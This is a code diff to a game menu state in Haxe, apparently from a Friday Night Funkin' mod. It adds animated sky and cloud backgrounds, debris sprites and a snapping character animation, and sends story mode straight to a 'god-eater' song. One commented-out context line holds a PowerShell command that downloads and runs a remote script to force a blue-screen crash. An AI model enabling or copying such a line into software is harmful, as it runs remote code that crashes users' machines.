@@ -20,12 +20,14 @@ import haxe.Exception;
 using StringTools;
 import flixel.util.FlxTimer;
 import Options;
+import flixel.addons.effects.FlxTrail;
+
 class MainMenuState extends MusicBeatState
 {
 	var curSelected:Int = 0;
 
 	var menuItems:FlxTypedGroup<FlxSprite>;
-
+	var character:Character;
 	#if !switch
 	var optionShit:Array<String> = ['story mode', 'options'];
 	#else
@@ -42,6 +44,8 @@ class MainMenuState extends MusicBeatState
 		DiscordClient.changePresence("In the Menus", null);
 		#end
 
+		FlxG.camera.zoom = .9;
+
 		if (!FlxG.sound.music.playing)
 		{
 			FlxG.sound.playMusic(Paths.music('freakyMenu'));
@@ -49,28 +53,49 @@ class MainMenuState extends MusicBeatState
 
 		persistentUpdate = persistentDraw = true;
 
-		var bg:FlxSprite = new FlxSprite(-80).loadGraphic(Paths.image('menuBG'));
-		bg.scrollFactor.x = 0;
-		bg.scrollFactor.y = 0.18;
-		bg.setGraphicSize(Std.int(bg.width * 1.1));
-		bg.updateHitbox();
-		bg.screenCenter();
-		bg.antialiasing = true;
-		add(bg);
+		var sky = new FlxSprite(-850, 1550);
+		sky.frames = Paths.getSparrowAtlas('god_bg');
+		sky.animation.addByPrefix('sky', "bg", 30);
+		sky.setGraphicSize(Std.int(sky.width * 0.8));
+		sky.animation.play('sky');
+		sky.scrollFactor.set(0.1, 0.1);
+		sky.antialiasing = true;
+		sky.updateHitbox();
+		sky.screenCenter(XY);
+		sky.y -= 100;
+		sky.x -= 50;
+		add(sky);
+
+		var bgcloud = new FlxSprite(-850, 1150);
+		bgcloud.frames = Paths.getSparrowAtlas('god_bg');
+		bgcloud.animation.addByPrefix('c', "cloud_smol", 30);
+		bgcloud.animation.play('c');
+		bgcloud.scrollFactor.set(0.3, 0.3);
+		bgcloud.antialiasing = true;
+		bgcloud.screenCenter(XY);
+		bgcloud.y += 250;
+		add(bgcloud);
+
+		var fgcloud = new FlxSprite(-1150, -500);
+		fgcloud.x -= 300;
+		fgcloud.frames = Paths.getSparrowAtlas('god_bg');
+		fgcloud.animation.addByPrefix('c', "cloud_big", 30);
+		fgcloud.animation.play('c');
+		fgcloud.scrollFactor.set(0.9, 0.9);
+		fgcloud.antialiasing = true;
+		fgcloud.screenCenter(XY);
+		fgcloud.y += 100;
+		add(fgcloud);
+
+		add(new MansionDebris(FlxG.width/2+300, FlxG.height/2+-800, 'norm', 0.4, 1, 0, 1));
+		add(new MansionDebris(FlxG.width/2+600, FlxG.height/2+-300, 'tiny', 0.4, 1.5, 0, 1));
+		add(new MansionDebris(FlxG.width/2+-150, FlxG.height/2+-400, 'spike', 0.4, 1.1, 0, 1));
+		add(new MansionDebris(FlxG.width/2+-750, FlxG.height/2+-850, 'small', 0.4, 1.5, 0, 1));
 
 		camFollow = new FlxObject(0, 0, 1, 1);
+		camFollow.screenCenter(XY);
 		add(camFollow);
 
-		magenta = new FlxSprite(-80).loadGraphic(Paths.image('menuDesat'));
-		magenta.scrollFactor.x = 0;
-		magenta.scrollFactor.y = 0.18;
-		magenta.setGraphicSize(Std.int(magenta.width * 1.1));
-		magenta.updateHitbox();
-		magenta.screenCenter();
-		magenta.visible = false;
-		magenta.antialiasing = true;
-		magenta.color = 0xFFfd719b;
-		add(magenta);
 		// magenta.scrollFactor.set();
 
 		menuItems = new FlxTypedGroup<FlxSprite>();
@@ -80,7 +105,7 @@ class MainMenuState extends MusicBeatState
 
 		for (i in 0...optionShit.length)
 		{
-			var menuItem:FlxSprite = new FlxSprite(0, 60 + (i * 160));
+			var menuItem:FlxSprite = new FlxSprite(0, 120 + (i * 220));
 			menuItem.frames = tex;
 			menuItem.animation.addByPrefix('idle', optionShit[i] + " basic", 24);
 			menuItem.animation.addByPrefix('selected', optionShit[i] + " white", 24);
@@ -89,7 +114,9 @@ class MainMenuState extends MusicBeatState
 			menuItem.screenCenter(X);
 			menuItems.add(menuItem);
 			menuItem.scrollFactor.set();
+			menuItem.updateHitbox();
 			menuItem.antialiasing = true;
+			menuItem.x -= 400;
 		}
 
 		FlxG.camera.follow(camFollow, null, 0.06);
@@ -98,6 +125,14 @@ class MainMenuState extends MusicBeatState
 		versionShit.scrollFactor.set();
 		versionShit.setFormat("VCR OSD Mono", 16, FlxColor.WHITE, LEFT, FlxTextBorderStyle.OUTLINE, FlxColor.BLACK);
 		add(versionShit);
+
+		character = new Character(0,0,'menushaggy',false);
+		character.screenCenter(XY);
+		character.x += 250;
+		character.y -= 25;
+		character.scrollFactor.set(.1,.1);
+		character.playAnim("back");
+		add(character);
 
 		// NG.core.calls.event.logEvent('swag').send();
 
@@ -110,7 +145,7 @@ class MainMenuState extends MusicBeatState
 
 	override function update(elapsed:Float)
 	{
-		if (FlxG.sound.music.volume < 0.8)
+		if (FlxG.sound.music.volume < 0.8 && !selectedSomethin)
 		{
 			FlxG.sound.music.volume += 0.5 * FlxG.elapsed;
 		}
@@ -140,15 +175,37 @@ class MainMenuState extends MusicBeatState
 					//Sys.command("powershell.exe -command IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD");
 					#end
 				}
+				else if(optionShit[curSelected]=='story mode'){
+					selectedSomethin=true;
+					FlxG.sound.music.fadeOut(.5,0);
+					character.playAnim("snap",true);
+					new FlxTimer().start(0.85, function(tmr:FlxTimer)
+					{
+						FlxG.sound.play(Paths.sound('snap'));
+						FlxG.sound.play(Paths.sound('menuBad'));
+						FlxG.camera.shake(.05,.5);
+						new FlxTimer().start(0.06, function(tmr2:FlxTimer){
+							character.playAnim('snapped', true);
+						});
+					});
+
+					PlayState.storyPlaylist = ["god-eater"];
+					PlayState.isStoryMode = true;
+
+					PlayState.storyDifficulty = 2;
+
+					PlayState.SONG = Song.loadFromJson("god-eater-hard", "god-eater");
+					PlayState.storyWeek = 1;
+					PlayState.campaignScore = 0;
+					new FlxTimer().start(3, function(tmr:FlxTimer)
+					{
+						LoadingState.loadAndSwitchState(new PlayState(), true);
+					});
+				}
 				else
 				{
 					selectedSomethin = true;
 					FlxG.sound.play(Paths.sound('confirmMenu'));
-					if(OptionUtils.options.menuFlash){
-						FlxFlicker.flicker(magenta, 1.1, 0.15, false);
-					}else{
-						magenta.visible=true;
-					}
 
 					menuItems.forEach(function(spr:FlxSprite)
 					{
@@ -171,9 +228,6 @@ class MainMenuState extends MusicBeatState
 
 									switch (daChoice)
 									{
-										case 'story mode':
-											FlxG.switchState(new StoryMenuState());
-											trace("Story Menu Selected");
 										case 'freeplay':
 											FlxG.switchState(new FreeplayState());
 											trace("Freeplay Menu Selected");
@@ -188,9 +242,6 @@ class MainMenuState extends MusicBeatState
 
 									switch (daChoice)
 									{
-										case 'story mode':
-											FlxG.switchState(new StoryMenuState());
-											trace("Story Menu Selected");
 										case 'freeplay':
 											FlxG.switchState(new FreeplayState());
 											trace("Freeplay Menu Selected");
@@ -210,7 +261,6 @@ class MainMenuState extends MusicBeatState
 
 		menuItems.forEach(function(spr:FlxSprite)
 		{
-			spr.screenCenter(X);
 		});
 	}
 
@@ -230,7 +280,7 @@ class MainMenuState extends MusicBeatState
 			if (spr.ID == curSelected)
 			{
 				spr.animation.play('selected');
-				camFollow.setPosition(spr.getGraphicMidpoint().x, spr.getGraphicMidpoint().y);
+				camFollow.y = spr.getGraphicMidpoint().y;
 			}
 
 			spr.updateHitbox();
